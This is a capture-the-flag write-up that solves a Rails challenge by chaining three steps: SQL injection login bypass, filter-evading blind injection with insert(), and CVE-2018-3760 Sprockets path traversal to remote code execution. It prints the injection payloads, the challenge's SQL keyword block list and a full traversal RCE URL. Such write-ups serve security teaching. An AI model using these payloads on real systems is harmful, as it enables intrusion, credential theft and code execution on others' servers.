This challenge was a ruby on rails application.  
The index route redirects to a login page, which is vulnerable to sql injection  
After people bypass auth with simple payloads like `' or 1=1 #` you will know that the goal is to retreive admin password using sqli and login into /admin.  
The filter was :  
```RUBY
hack =  /union|benchmark|strcmp|locate|STRCMP|position|file|concat|sleep|md5|mid|sub|count|and|left|load|space|instr|pad|conv|right|ascii|cast|reverse|locate|glob|having|like|match|char|regexp|limit|order|group|hex|information/i
```
So there is no substr functions no unions etc ...  
A possible solution(there are others) is to use insert function basically you can do :  
SELECT ('a')=(insert((SELECT password from users where isadmin=1), 2, 255, ''));  
And do blind injection to retreive password, more details about this technique are [here](https://gist.github.com/stypr/43fce10db9fa44b5f072442245d9e82e)  
After finding the admin password and login into /admin, we will be redirected to /upload where you can upload any file you want, the only thing that is returned is the PATH of that file.  
Gemfile shows the version of Sprockets that was used, which was vulnerable to CVE-2018-3760  
Basically you need to upload an erb file containing your payload and abuse the CVE to get RCE :  
The payload for rce looks like : http://185.168.131.128:8080/assets/file:%2f%2f/home/web03/app/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252E%252E/%252E%252E/home/web03/app/uploads/resumes/someHash/file.erb%3Ftype=text/plain  
For more details about the CVE , check Orange Tsai talk at BHUSA 2018.
Note: The application was on production mode but flag assets.compile was on.
